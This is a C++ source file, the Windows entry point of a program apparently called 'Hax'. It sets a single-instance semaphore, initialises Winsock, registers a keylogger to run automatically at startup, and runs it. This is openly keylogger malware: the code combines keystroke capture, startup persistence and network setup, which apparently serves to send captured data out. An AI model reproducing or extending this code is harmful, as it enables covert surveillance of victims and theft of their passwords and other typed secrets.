
#include "stdafx.h"
#include "Hax.h"
#include "Keylogger.h"

#pragma comment(lib, "Ws2_32.lib")



TCHAR semName[] = _T("VSem");

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
    HANDLE hSem = CreateSemaphore(NULL, 1, 1, semName);
    if (WaitForSingleObject(hSem, 0) == WAIT_TIMEOUT)
    {
        Error(_T("Already running"));
        CloseHandle(hSem);
        return 0;
    }

	WSADATA WSAData;
    WSAStartup(MAKEWORD(2, 0), &WSAData);

    Keylogger kl;
    kl.RegisterAutorun();
    kl.Run();

    WSACleanup();
    CloseHandle(hSem);
    return 0;
}
